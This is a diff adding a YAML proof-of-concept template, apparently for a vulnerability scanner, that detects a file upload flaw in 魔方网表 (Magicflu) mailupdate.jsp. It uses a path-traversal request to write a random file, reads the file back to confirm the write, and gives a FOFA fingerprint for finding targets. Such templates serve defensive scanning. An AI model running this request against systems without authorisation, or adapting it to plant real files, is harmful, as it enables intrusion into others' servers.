@@ -1,0 +1,23 @@
+id: poc-yaml-mofangwangbiao-mailupdate-jsp-file-upload
+info:
+  name: 魔方网表 mailupdate.jsp 文件上传漏洞
+  severity: high
+  tags:
+  - 文件上传
+  finger: 魔方网表
+  fofa: icon_hash="694014318"
+variables:
+  name: random_str(6)
+  content: random_str(16)
+requests:
+- method: GET
+  path: /magicflu/html/mail/mailupdate.jsp?messageid=/../../../{{.name}}.txt&messagecontent={{.content}}
+  expression: 'status_code == 200 && contains(headers,"Content-Type: text/html")
+
+    '
+- method: GET
+  path: /magicflu/{{.name}}.txt
+  expression: 'status_code == 200 && contains(body,content)
+
+    '
+transport: http
